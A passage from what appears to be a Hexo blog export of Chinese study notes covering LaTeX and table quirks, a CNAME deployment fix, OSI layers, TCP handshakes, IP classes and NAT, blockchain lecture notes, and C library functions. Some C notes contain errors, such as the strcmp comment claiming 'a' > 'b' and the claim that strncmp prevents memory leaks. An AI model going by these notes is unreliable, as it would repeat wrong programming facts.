class="comment"># Average Word Length (chars count in word)</span></span><br><span class="line"> <span class="attr">awl:</span> <span class="number">4</span></span><br><span class="line"> <span class="comment"># Words Per Minute</span></span><br><span class="line"> <span class="attr">wpm:</span> <span class="number">275</span></span><br></pre></td></tr></table></figure><h2 id="latex公式支持"><a href="#latex公式支持" class="headerlink" title="latex公式支持"></a>latex公式支持</h2><h3 id="Next主题中自带latex插件"><a href="#Next主题中自带latex插件" class="headerlink" title="Next主题中自带latex插件"></a>Next主题中自带latex插件</h3><p>修改<code>_config.xml</code>文件即可</p><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a><span id="latex">注意事项</span></h4><h5 id="1-表格中不能使用-，需要使用latex中的-mid来代替"><a href="#1-表格中不能使用-，需要使用latex中的-mid来代替" class="headerlink" title="1. 表格中不能使用\|，需要使用latex中的\mid来代替"></a>1. 表格中不能使用<code>\|</code>，需要使用latex中的<code>\mid</code>来代替</h5><p>示例</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| 描述       | 代码              |</span><br><span class="line">| ---------- | ----------------- |</span><br><span class="line">| 使用&#96;\|&#96;   | a            \| b |</span><br><span class="line">| 使用&#96;\mid&#96; | a $ \mid $ b      |</span><br></pre></td></tr></table></figure><p>效果</p><table><thead><tr><th>描述</th><th>代码</th></tr></thead><tbody><tr><td>使用<code>|</code></td><td>a | b</td></tr><tr><td>使用<code>\mid</code></td><td>a $ \mid $ b</td></tr></tbody></table><h5 id="2-latex公式在hexo中不能写注释，并且换行使用-无效，需要使用-，大括号需要使用-才可使用"><a href="#2-latex公式在hexo中不能写注释，并且换行使用-无效，需要使用-，大括号需要使用-才可使用" class="headerlink" title="2. latex公式在hexo中不能写注释，并且换行使用\\无效，需要使用\\\\，大括号需要使用\\{才可使用"></a>2. latex公式在hexo中不能写注释，并且换行使用<code>\\</code>无效，需要使用<code>\\\\</code>，大括号需要使用<code>\\{</code>才可使用</h5><h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="latex注意事项"><a href="#latex注意事项" class="headerlink" title="latex注意事项"></a><a href="#latex">latex注意事项</a></h2><h2 id="表格相关"><a href="#表格相关" class="headerlink" title="表格相关"></a>表格相关</h2><p>表格使用markdown无法合并单元格，如果使用html标签来写，需要写到一行中，否则会出现大段空行</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># 没有空行</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">th</span>&gt;</span></span>姓名<span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span>Bill Gates<span class="xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">th</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span></span>电话<span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span>555 77 854<span class="xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span>555 77 855<span class="xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="section"># 大段空行</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="code">    &lt;tr&gt;</span></span><br><span class="line"><span class="code">        &lt;th&gt;姓名&lt;/th&gt;</span></span><br><span class="line"><span class="code">        &lt;td&gt;Bill Gates&lt;/td&gt;</span></span><br><span class="line"><span class="code">    &lt;/tr&gt;</span></span><br><span class="line"><span class="code">    &lt;tr&gt;</span></span><br><span class="line"><span class="code">        &lt;th rowspan="2"&gt;电话&lt;/th&gt;</span></span><br><span class="line"><span class="code">        &lt;td&gt;555 77 854&lt;/td&gt;</span></span><br><span class="line"><span class="code">    &lt;/tr&gt;</span></span><br><span class="line"><span class="code">    &lt;tr&gt;</span></span><br><span class="line"><span class="code">        &lt;td&gt;555 77 855&lt;/td&gt;</span></span><br><span class="line"><span class="code">    &lt;/tr&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>效果</p><table><tr><th>姓名</th><td>Bill Gates</td></tr><tr><th rowspan="2">电话</th><td>555 77 854</td></tr><tr><td>555 77 855</td></tr></table><table><tr><th>姓名</th><td>Bill Gates</td></tr><tr><th rowspan="2">电话</th><td>555 77 854</td></tr><tr><td>555 77 855</td></tr></table><h2 id="自建域名在博客部署后解析失败"><a href="#自建域名在博客部署后解析失败" class="headerlink" title="自建域名在博客部署后解析失败"></a>自建域名在博客部署后解析失败</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><ul><li>博客部署到github上时，如果使用自建域名需要添加<code>CNAME</code>文件到根目录下</li><li>hexo在部署时会把远程仓库整个覆盖掉，导致<code>CNAME</code>文件缺失而解析失败</li></ul><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><ul><li>在<code>\hexo\source</code>目录下放入<code>CNAME</code>文件即可</li><li>所有source目录下的除了规定格式的会解析，其余文件都会原封不动放入仓库</li></ul>]]></content>
      <categories>
        <category>Program</category>
        <category>Document</category>
      </categories>
  </entry>
  <entry>
    <title>计算机网络学习</title>
    <url>/2018/09/28/2018-09-28-computerNetworkStudy/</url>
    <content><![CDATA[<h1 id="网络OSI七层模型"><a href="#网络OSI七层模型" class="headerlink" title="网络OSI七层模型"></a>网络OSI七层模型</h1><img src="/2018/09/28/2018-09-28-computerNetworkStudy/2018_09_28_01.jpg" width="80%"><h2 id="分层介绍"><a href="#分层介绍" class="headerlink" title="分层介绍"></a>分层介绍</h2><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><ul><li>网络服务与最终用户的一个接口。</li><li>协议有：HTTP FTP TFTP SMTP SNMP DNS TELNET HTTPS POP3 DHCP</li></ul><h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><ul><li>数据的表示、安全、压缩。（在五层模型里面已经合并到了应用层）</li><li>格式有，JPEG、ASCll、DECOIC、加密格式等</li></ul><h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><ul><li>建立、管理、终止会话。（在五层模型里面已经合并到了应用层）</li><li>对应主机进程，指本地主机与远程主机正在进行的会话</li></ul><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><ul><li>定义传输数据的协议端口号，以及流控和差错校验。</li><li>协议有：TCP UDP，数据包一旦离开网卡即进入网络传输层</li></ul><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><ul><li>进行逻辑地址寻址，实现不同网络之间的路径选择。</li><li>协议有：ICMP IGMP IP（IPV4 IPV6） ARP RARP</li></ul><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><ul><li>建立逻辑连接、进行硬件地址寻址、差错校验 [2] 等功能。（由底层网络定义协议）</li><li>将比特组合成字节进而组合成帧，用MAC地址访问介质，错误发现但不能纠正。</li></ul><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><ul><li>建立、维护、断开物理连接。（由底层网络定义协议）</li></ul><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><ul><li>TCP/IP 层级模型结构，应用层之间的协议通过逐级调用传输层（Transport layer）、网络层（Network Layer）和物理数据链路层（Physical Data Link）而可以实现应用层的应用程序通信互联。</li><li>应用层需要关心应用程序的逻辑细节，而不是数据在网络中的传输活动。应用层其下三层则处理真正的通信细节。在 Internet 整个发展过程中的所有思想和着重点都以一种称为 RFC（Request For Comments）的文档格式存在。针对每一种特定的 TCP/IP 应用，有相应的 RFC [3] 文档。</li><li>一些典型的 TCP/IP 应用有 FTP、Telnet、SMTP、SNTP、REXEC、TFTP、LPD、SNMP、NFS、INETD 等。RFC 使一些基本相同的 TCP/IP 应用程序实现了标准化，从而使得不同厂家开发的应用程序可以互相通信</li></ul><h1 id="传输层-1"><a href="#传输层-1" class="headerlink" title="传输层"></a>传输层</h1><h2 id="TCP握手"><a href="#TCP握手" class="headerlink" title="TCP握手"></a>TCP握手</h2><h3 id="建立TCP连接：三次握手协议"><a href="#建立TCP连接：三次握手协议" class="headerlink" title="建立TCP连接：三次握手协议"></a>建立TCP连接：三次握手协议</h3><ul><li>客户端：我要对你讲话，你能听到吗；</li><li>服务端：我能听到；而且我也要对你讲话，你能听到吗；</li><li>客户端：我也能听到。<br>…….<br>互相开始通话<br>……..</li></ul><h3 id="关闭TCP连接：四次握手协议"><a href="#关闭TCP连接：四次握手协议" class="headerlink" title="关闭TCP连接：四次握手协议"></a>关闭TCP连接：四次握手协议</h3><ul><li>客户端：我说完了，我要闭嘴了；</li><li>服务端：我收到请求，我要闭耳朵了；<br>（客户端收到这个确认，于是安心地闭嘴了。）<br>…….<br>服务端还没倾诉完自己的故事，于是继续唠唠叨叨向客户端说了半天，直到说完为止<br>…….</li><li>服务端：我说完了，我也要闭嘴了；</li><li>客户端：我收到请求，我要闭耳朵了；（事实上，客户端为了保证这个确认包成功送达，等待了两个最大报文生命周期后，才闭上耳朵。）<br>（服务端收到这个确认，于是安心地闭嘴了。）</li></ul><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ol><li>客户端收到请求包后，为什么要等待两个最大报文生命周期后，才闭上耳朵呢？<ul><li>为了以防万一，因为最后一个发往服务端B的确认包有可能丢失。若丢失，服务端这里过了响应超时时间timeOut，会再次往客户端A发送关闭连接请求，这时候客户端得保证自己还没闭上耳朵，还能接收请求才行。</li><li>服务端B再次发送的请求包到达客户端A时间，绝不会超过 最大报文生命周期。</li><li>这里的问题是，到底上面服务端的是如何判断超时的（我不是很清楚），假如是以自己发送请求时刻开始计时，半天未应答，为超时，那么：</li><li>从服务端B发送请求包的时刻开始算，经过( TimeOut + 最大报文生命周期 )后，A必须还能接收数据包。</li><li>那么A需要等待的时间是：( TimeOut + 最大报文生命周期 ) - （上一个关闭l请求包从B发送到A的时长）。</li><li>网上这块儿都讲得很模糊，一般就是说到A需要等待( TimeOut + 最大报文生命周期 ) &lt; 2 * 最大报文生命周期，所以等待2 * 最大报文生命周期可以确保万无一失。</li><li>事实上，这里关键需要搞清楚服务端的是如何判断超时的，我不是很清楚。但是假如是以自己发送请求的时刻开始计时，那么TimeOut应该是一个往返的最大时间吧，你们确定一个“请求-应答”往返的最大时间小于最大报文生命周期。</li><li>当然，所有地方都是说要等待 2 * 最大生命周期，虽然没具体搞明白，但是我也同样相信。只是，网上的各种解释，都解析的模模糊糊，而且好多地方从逻辑上都不能完全说通诶，对那些解释，我没法完全相信。</li></ul></li></ol><h1 id="网络层-1"><a href="#网络层-1" class="headerlink" title="网络层"></a>网络层</h1><h2 id="ip地址分类"><a href="#ip地址分类" class="headerlink" title="ip地址分类"></a>ip地址分类</h2><img src="/2018/09/28/2018-09-28-computerNetworkStudy/2019_10_14_02.png" width="80%"><p>IP地址根据网络号和主机号来分，分为A、B、C三类及特殊地址D、E。全0和全1的都保留不用。</p><ul><li>A类：(1.0.0.0-126.0.0.0)（默认子网掩码：255.0.0.0或 0xFF000000）第一个字节为网络号，后三个字节为主机号。该类IP地址的最前面为“0”，所以地址的网络号取值于1~126之间。一般用于大型网络。</li><li>B类：(128.0.0.0-191.255.0.0)（默认子网掩码：255.255.0.0或0xFFFF0000）前两个字节为网络号，后两个字节为主机号。该类IP地址的最前面为“10”，所以地址的网络号取值于128~191之间。一般用于中等规模网络。</li><li>C类：(192.0.0.0-223.255.255.0)（子网掩码：255.255.255.0或 0xFFFFFF00）前三个字节为网络号，最后一个字节为主机号。该类IP地址的最前面为“110”，所以地址的网络号取值于192~223之间。一般用于小型网络。</li><li>D类：是多播地址。该类IP地址的最前面为“1110”，所以地址的网络号取值于224~239之间。一般用于多路广播用户[1] 。</li><li>E类：是保留地址。该类IP地址的最前面为“1111”，所以地址的网络号取值于240~255之间。</li></ul><h1 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h1><h2 id="1-局域网和外网？"><a href="#1-局域网和外网？" class="headerlink" title="1. 局域网和外网？"></a>1. 局域网和外网？</h2><h3 id="一个局域网内共用一个外网ip，数据如何定位到自己的电脑上的？"><a href="#一个局域网内共用一个外网ip，数据如何定位到自己的电脑上的？" class="headerlink" title="一个局域网内共用一个外网ip，数据如何定位到自己的电脑上的？"></a>一个局域网内共用一个外网ip，数据如何定位到自己的电脑上的？</h3><ul><li>通过端口定位</li><li>电脑通过路由器连接到外网时，会在路由器上映射一个nat表</li><li>表中映射为<code>ip:port</code>，会将路由器上随机生成一个端口，并且将局域网ip加端口和外网ip加端口相互映射。</li><li>本地电脑通过这个映射表连上外网</li></ul><p>如：</p><ul><li>路由器外网ip：115.156.207.252</li><li>电脑的局域网ip：192.168.11.109</li></ul><p>电脑连外网时，通过本机的<code>80</code>端口访问网页。路由器会随机生成一个端口号，比如<code>1234</code>。路由器的映射表就会有一条记录：<code>115.156.207.252:1234 &lt;-&gt; 192.168.11.109:80</code>，外网的数据就通过返回到<code>115.156.207.252:1234</code>这个地址来给到电脑的<code>80</code>端口上。</p>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链-达闼科技师兄分享</title>
    <url>/2018/09/19/2018-09-19-DakaQukuailian/</url>
    <content><![CDATA[<h1 id="区块链定义"><a href="#区块链定义" class="headerlink" title="区块链定义"></a>区块链定义</h1><p>让数据包可以传递价值</p><h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><p>两个节点的交易让所有节点数据库都要更新</p><h1 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h1><ul><li>一式多份</li><li>一诺千金（区块链防篡改）</li></ul><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ul><li>效率问题怎么解决</li></ul>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言学习笔记</title>
    <url>/2018/09/18/2018-09-18-CStudy/</url>
    <content><![CDATA[<h1 id="C标准库"><a href="#C标准库" class="headerlink" title="C标准库"></a>C标准库</h1><h2 id="string-h"><a href="#string-h" class="headerlink" title="string.h"></a>string.h</h2><h3 id="初始化函数-memset"><a href="#初始化函数-memset" class="headerlink" title="初始化函数 memset()"></a>初始化函数 memset()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 将n bytes起始地址为s的内存全部初始化为c</span></span><br><span class="line"><span class="comment"> * @param __s 初始化地址</span></span><br><span class="line"><span class="comment"> * @param __c 初始化的值</span></span><br><span class="line"><span class="comment"> * @param __n 初始化的大小</span></span><br><span class="line"><span class="comment"> * @return __s的地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memset</span> <span class="params">(<span class="keyword">void</span> *__s, <span class="keyword">int</span> __c, <span class="keyword">size_t</span> __n)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>函数是按byte(8 bits)进行初始化的，每个字节均会被初始化为__c取前八位的值。</strong></p><h3 id="字符串拷贝-strdup"><a href="#字符串拷贝-strdup" class="headerlink" title="字符串拷贝 strdup()"></a>字符串拷贝 strdup()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 拷贝字符串到空指针里，附带内存申请，注意指针原来指向的地址需要先free</span></span><br><span class="line"><span class="comment"> * @_Src 要拷贝的字符串</span></span><br><span class="line"><span class="comment"> * @return 申请后拷贝到的地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">strdup</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *_Src)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="字符串比较函数-strcmp和strncpm"><a href="#字符串比较函数-strcmp和strncpm" class="headerlink" title="字符串比较函数 strcmp和strncpm"></a>字符串比较函数 strcmp和strncpm</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 比较字符串，返回比较的值</span></span><br><span class="line"><span class="comment"> * @_Str1 要对比的字符串</span></span><br><span class="line"><span class="comment"> * @_Str2 要对比的字符串</span></span><br><span class="line"><span class="comment"> * @return 遇到'\0'或者不一样的字符串为止，第一个不一样的字符对比大小</span></span><br><span class="line"><span class="comment"> *          'a'  &gt; '\0',     1;</span></span><br><span class="line"><span class="comment"> *          '\0' &lt; 'a',     -1;</span></span><br><span class="line"><span class="comment"> *          'a'  &gt; 'b',      1;</span></span><br><span class="line"><span class="comment"> *          'b'  &lt; 'a',     -1;</span></span><br><span class="line"><span class="comment"> *          '\0' &lt; '\0',     0;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *_Str1,<span class="keyword">const</span> <span class="keyword">char</span> *_Str2)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//多了大小限制，防止内存泄漏</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">strncmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *_Str1,<span class="keyword">const</span> <span class="keyword">char</span> *_Str2, <span class="keyword">size_t</span> _MaxCount)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="setjmp"><a href="#setjmp" class="headerlink" title="setjmp"></a>setjmp</h2><h3 id="非局部跳转函数-setjmp-longjmp"><a href="#非局部跳转函数-setjmp-longjmp" class="headerlink" title="非局部跳转函数 setjmp()/longjmp()"></a>非局部跳转函数 setjmp()/longjmp()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 设置返回位置</span></span><br><span class="line"><span class="comment"> * @param __env 保存状态信息的缓存地址</span></span><br><span class="line"><span class="comment"> * @return 直接调用返回，0；调用longjmp后返回longjmp给入参数__val</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setjmp</span> <span class="params">(jmp_buf __env)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 跳转到setjmp的位置</span></span><br><span class="line"><span class="comment"> * @param __env 跳转位置的状态信息</span></span><br><span class="line"><span class="comment"> * @param __val 跳转位置返回值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">longjmp</span> <span class="params">(jmp_buf __env, <span class="keyword">int</span> __val)</span></span>;</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;csetjmp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rainbow</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Rainbow() &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Rainbow()"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~Rainbow() &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"~Rainbow()"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">jmp_buf kansas;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">oz</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Rainbow rb;</span><br><span class="line">    longjmp(kansas, <span class="number">47</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> code = setjmp(kansas);</span><br><span class="line">    <span class="keyword">if</span> ((code = setjmp(kansas)) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Setjmp code "</span> &lt;&lt; code &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        oz();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Setjmp code "</span> &lt;&lt; code &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Setjmp code 0</span><br><span class="line">Rainbow()</span><br><span class="line">Setjmp code 47</span><br></pre></td></tr></table></figure><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>在上述实例中发现类没有被析构，这两个函数可以实现跳转但是不会检测类相关，所以类不会被析构</li></ul><h1 id="类型大小"><a href="#类型大小" class="headerlink" title="类型大小"></a>类型大小</h1><ul><li><code>short</code>相当于<code>short int</code></li><li><code>long</code>相当于<code>long int</code></li><li><code>size_t</code>相当于<code>unsigned long</code></li><li><code>long</code>和指针大小都等于编译环境的位数</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//32位编译</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argC, <span class="keyword">char</span>* arg[])</span> </span>&#123;</span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of void * %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));         <span class="comment">//4</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of float %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">float</span>));           <span class="comment">//4</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of double %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">double</span>));         <span class="comment">//8</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of char %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));             <span class="comment">//1</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of short %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">short</span>));           <span class="comment">//2</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of int %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));               <span class="comment">//4</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of long %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">long</span>));             <span class="comment">//4</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of long long %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>));   <span class="comment">//8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//64位编译</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argC, <span class="keyword">char</span>* arg[])</span> </span>&#123;</span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of void * %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));         <span class="comment">//8</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of float %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">float</span>));           <span class="comment">//4</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of double %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">double</span>));         <span class="comment">//8</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of char %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));             <span class="comment">//1</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of short %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">short</span>));           <span class="comment">//2</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of int %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));               <span class="comment">//4</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of long %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">long</span>));             <span class="comment">//8</span></span><br><span class="line">    LOG_DEBUG(<span class="string">"Size of long long %d"</span>, <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>));   <span class="comment">//8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="char-a和char-a-的区别"><a href="#char-a和char-a-的区别" class="headerlink" title="char *a和char a[]的区别"></a>char *a和char a[]的区别</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *a = <span class="string">"Hello"</span>;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"Hello"</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>char *a = “Hello”;</th><th>char a[] = “Hello”;</th></tr></thead><tbody><tr><td>字符串所在区域</td><td>常量区</td><td>栈</td></tr><tr><td>可读可写</td><td>常量区不可写</td><td>可读可写</td></tr><tr><td>赋值时刻</td><td>编译时确定</td><td>运行时确定</td></tr><tr><td>存取效率</td><td>属于静态存储区，较慢</td><td>存于栈上，较快</td></tr><tr><td>sizeof(a)</td><td>指针的大小，取决于编译环境</td><td>5 + 1，字符串长度加<code>&#39;\0&#39;</code></td></tr></tbody></table><h1 id="变量内存分配方式"><a href="#变量内存分配方式" class="headerlink" title="变量内存分配方式"></a>变量内存分配方式</h1><p>内存分配有三种：静态存储区、堆区、栈区。</p><ol><li>静态存储区：内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。它主要存放静态数据、全局数据和常量。</li><li>栈区：在执行函数时，函数（包括main函数）内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。（任何变量都处于站区，例如int a[] = {1, 2},变量a处于栈区。数组的内容也存在于栈区。）</li><li>堆区：亦称动态内存分配。程序在运行的时候用malloc或new申请任意大小的内存，程序员自己负责在适当的时候用free或delete释放内存。动态内存的生存期可以由我们决定，如果我们不释放内存，程序将在最后才释放掉动态内存。 但是，良好的编程习惯是：如果某动态内存不再使用，需要将其释放掉，并立即将指针置位NULL，防止产生野指针。</li></ol><h1 id="输出家族函数"><a href="#输出家族函数" class="headerlink" title="输出家族函数"></a>输出家族函数</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>; <span class="comment">//输出到标准输出</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fprintf</span><span class="params">(FILE *stream, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>; <span class="comment">//输出到文件</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sprintf</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>; <span class="comment">//输出到字符串str中</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">snprintf</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>; <span 